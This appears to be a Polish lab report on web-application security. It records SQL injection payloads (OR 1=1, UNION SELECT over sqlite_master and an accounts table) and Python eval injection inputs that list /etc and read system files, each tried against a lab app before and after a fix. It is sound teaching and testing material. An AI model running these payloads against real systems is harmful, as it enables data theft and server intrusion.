# Zadanie 1

## Klucz 1234

Liczba wierszy: 1

- anna: Hello world

## Klucz '

OperationalError: unrecognized token: "'''"

Klucz ' OR 1=1 --

Liczba wierszy: 4

- anna: Hello world
- piotr: Top secret
- muszkieter: Jeden za wszystkich
- admin: Szyfr do sejfu: 7319 (fikcyjny)

## Klucz ' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --

Liczba wierszy: 2

- konta: CREATE TABLE konta(login TEXT, rola TEXT, email TEXT)
- sekrety: CREATE TABLE sekrety(klucz TEXT, wlasciciel TEXT, sekret TEXT)

## Klucz ' UNION SELECT login, email FROM konta --

Liczba wierszy: 2

- admin: <admin@lab7.example>
- anna: <anna@lab7.example>

## Klucz ' UNION SELECT login, rola FROM konta --

```sql
SELECT wlasciciel, sekret FROM sekrety WHERE klucz = '' UNION SELECT login, rola FROM konta --'
```

Liczba wierszy: 2

- admin: administrator
- anna: uzytkownik

# Zadanie 2

Podczas testów na stronie nie pojawił się żaden komunikat SQLite.

## Klucz 1234

Liczba wierszy: 1

- anna: Hello world

## Klucz '

Liczba wierszy: 0

## Klucz ' OR 1=1 --

Liczba wierszy: 0

## Klucz ' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --

Liczba wierszy: 0

## Klucz ' UNION SELECT login, email FROM konta --

Liczba wierszy: 0

## Klucz d'Artagnan

Liczba wierszy: 1

- muszkieter: Jeden za wszystkich

## Logi

```
web-1  | 172.18.0.1 - - [18/Nov/2026 12:13:18] "GET /sekret?klucz=1234 HTTP/1.1" 200 -
web-1  | 172.18.0.1 - - [18/Nov/2026 12:13:43] "GET /sekret?klucz=' HTTP/1.1" 200 -
web-1  | 172.18.0.1 - - [18/Nov/2026 12:14:16] "GET /sekret?klucz='+OR+1%3D1+-- HTTP/1.1" 200 -
web-1  | 172.18.0.1 - - [18/Nov/2026 12:14:18] "GET /sekret?klucz='+OR+1%3D1+-- HTTP/1.1" 200 -
web-1  | 172.18.0.1 - - [18/Nov/2026 12:14:46] "GET /sekret?klucz='+UNION+SELECT+name,+sql+FROM+sqlite_master+WHERE+type%3D'table'+-- HTTP/1.1" 200 -
web-1  | 172.18.0.1 - - [18/Nov/2026 12:14:47] "GET /sekret?klucz='+UNION+SELECT+name,+sql+FROM+sqlite_master+WHERE+type%3D'table'+-- HTTP/1.1" 200 -
web-1  | 172.18.0.1 - - [18/Nov/2026 12:15:01] "GET /sekret?klucz='+UNION+SELECT+login,+email+FROM+konta+-- HTTP/1.1" 200 -
web-1  | 172.18.0.1 - - [18/Nov/2026 12:15:10] "GET /sekret?klucz=d'Artagnan HTTP/1.1" 200 -
```

# Zadanie 3

## przed zmianami

### **import**('os').listdir('/etc')

Wynik:

['secfixes.d', 'shadow', 'passwd', 'apk', 'network', 'protocols', 'profile.d', 'profile', 'inittab', 'modules', 'crontabs', 'opt', 'hostname', 'os-release', 'busybox-paths.d', 'fstab', 'issue', 'alpine-release', 'ssl1.1', 'logrotate.d', 'group', 'hosts', 'periodic', 'services', 'sysctl.d', 'securetty', 'mtab', 'udhcpc', 'modules-load.d', 'modprobe.d', 'motd', 'sysctl.conf', 'nsswitch.conf', 'shells', 'ssl', 'resolv.conf', 'shadow-', 'passwd-', 'group-', 'inputrc', 'terminfo', 'krb5.conf', 'netconfig', 'bindresvport.blacklist', 'ca-certificates', 'ca-certificates.conf']

### open('/etc/os-release').read()

Wynik:

NAME="Alpine Linux" ID=alpine VERSION_ID=3.24.4 PRETTY_NAME="Alpine Linux v3.24" HOME_URL="https://alpinelinux.org/" BUG_REPORT_URL="https://gitlab.alpinelinux.org/alpine/aports/-/issues"

### **import**('os').getuid()

Wynik:

1000

## po zmianach

### 2+3

Wynik:

5.0

### 7/2

Wynik:

3.5

### -1.5\*4

Wynik:

-6.0

### 1/0

Wynik:

Błąd: dzielenie przez zero.

### **import**('os').listdir('/etc')

Wynik:

Błąd: niepoprawne wyrażenie.

kod 400

### open('/etc/os-release').read()

Wynik:

Błąd: niepoprawne wyrażenie.

kod 400

### **import**('os').getuid()

Wynik:

Błąd: niepoprawne wyrażenie.

kod 400

### puste pole

Wynik:

Błąd: niepoprawne wyrażenie.

kod 400
